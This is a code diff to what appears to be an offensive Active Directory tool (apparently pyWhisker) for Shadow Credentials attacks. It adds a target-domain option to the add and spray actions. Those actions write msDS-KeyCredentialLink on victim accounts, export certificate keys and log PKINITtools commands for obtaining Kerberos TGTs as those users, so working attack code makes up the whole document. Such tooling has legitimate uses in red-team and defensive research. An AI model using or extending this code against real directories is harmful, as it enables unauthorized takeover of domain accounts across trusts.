@@ -247,17 +247,18 @@ def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='
     return True
 
 class ShadowCredentials(object):
-    def __init__(self, ldap_server, ldap_session, target_samname):
+    def __init__(self, ldap_server, ldap_session, target_samname, target_domain=None):
         super(ShadowCredentials, self).__init__()
         self.ldap_server = ldap_server
         self.ldap_session = ldap_session
         self.delegate_from = None
         self.target_samname = target_samname
         self.target_dn = None
+        self.target_domain_dn = ','.join(f'DC={component}' for component in target_domain.split('.')) if target_domain is not None else None
         logger.debug('Initializing domainDumper()')
         cnf = ldapdomaindump.domainDumpConfig()
         cnf.basepath = None
-        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf)
+        self.domain_dumper = ldapdomaindump.domainDumper(self.ldap_server, self.ldap_session, cnf, root=self.target_domain_dn)
 
 
     def info(self, device_id):
@@ -323,7 +324,7 @@ class ShadowCredentials(object):
             logger.info('Attribute msDS-KeyCredentialLink does not exist')
         return
 
-    def add(self, password, path, export_type, domain):
+    def add(self, password, path, export_type, domain, target_domain):
         logger.info("Searching for the target account")
         result = self.get_dn_sid_from_samname(self.target_samname)
         if not result:
@@ -365,7 +366,7 @@ class ShadowCredentials(object):
                     logger.success("Saved PEM private key at path: %s" % path + "_priv.pem")
                     logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     logger.verbose("Run the following command to obtain a TGT")
-                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, self.target_samname, path))
+                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, target_domain if target_domain is not None else domain, self.target_samname, path))
                 elif export_type == "PFX":
                     if password is None:
                         password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
@@ -375,7 +376,7 @@ class ShadowCredentials(object):
                     logger.info("Must be used with password: %s" % password)
                     logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     logger.verbose("Run the following command to obtain a TGT")
-                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, self.target_samname, path))
+                    logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, target_domain if target_domain is not None else domain, self.target_samname, path))
             else:
                 if self.ldap_session.result['result'] == 50:
                     logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
@@ -388,7 +389,7 @@ class ShadowCredentials(object):
         return
 
 
-    def spray(self, password, path, export_type, domain):
+    def spray(self, password, path, export_type, domain, target_domain):
         logger.info("Performing attempts to add msDS-KeyCredentialLink for a list of users")
         if type(self.target_samname) == str:
             self.target_samname = [self.target_samname]
@@ -437,9 +438,9 @@ class ShadowCredentials(object):
             logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
             logger.verbose("Run the following command to obtain a TGT")
             if export_type == "PEM":
-                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem <USERNAME>_%s_cert.pem -key-pem <USERNAME>_%s_priv.pem %s/<USERNAME> <USERNAME>.ccache" % (path, path, domain))
+                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem <USERNAME>_%s_cert.pem -key-pem <USERNAME>_%s_priv.pem %s/<USERNAME> <USERNAME>.ccache" % (path, path, target_domain if target_domain is not None else domain))
             elif export_type == "PFX":
-                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx <USERNAME>_%s.pfx -pfx-pass %s %s/<USERNAME> <USERNAME>.ccache" % (path, password, domain))
+                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx <USERNAME>_%s.pfx -pfx-pass %s %s/<USERNAME> <USERNAME>.ccache" % (path, password, target_domain if target_domain is not None else domain))
 
 
     def remove(self, device_id):
@@ -747,6 +748,7 @@ def parse_args():
     authconn.add_argument('--dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
     authconn.add_argument("-d", "--domain", dest="auth_domain", metavar="DOMAIN", action="store", help="(FQDN) domain to authenticate to")
     authconn.add_argument("-u", "--user", dest="auth_username", metavar="USER", action="store", help="user to authenticate with")
+    authconn.add_argument("-td", "--target-domain", type=str, dest="target_domain", help="Target domain (if different than the domain of the authenticating user)")
 
     secret = parser.add_argument_group()
     cred = secret.add_mutually_exclusive_group()
@@ -798,6 +800,8 @@ def main():
     else:
         target_samname = args.target_samname
 
+    target_domain = args.target_domain
+
     auth_lm_hash = ""
     auth_nt_hash = ""
     if args.auth_hashes is not None:
@@ -809,13 +813,13 @@ def main():
 
     try:
         ldap_server, ldap_session = init_ldap_session(args=args, domain=args.auth_domain, username=args.auth_username, password=args.auth_password, lmhash=auth_lm_hash, nthash=auth_nt_hash)
-        shadowcreds = ShadowCredentials(ldap_server, ldap_session, target_samname)
+        shadowcreds = ShadowCredentials(ldap_server, ldap_session, target_samname, target_domain)
         if args.action == 'list':
             shadowcreds.list()
         elif args.action == 'add':
-            shadowcreds.add(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain)
+            shadowcreds.add(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain, target_domain=target_domain)
         elif args.action == 'spray':
-            shadowcreds.spray(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain)
+            shadowcreds.spray(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain, target_domain=target_domain)
         elif args.action == 'remove':
             shadowcreds.remove(args.device_id)
         elif args.action == 'info':
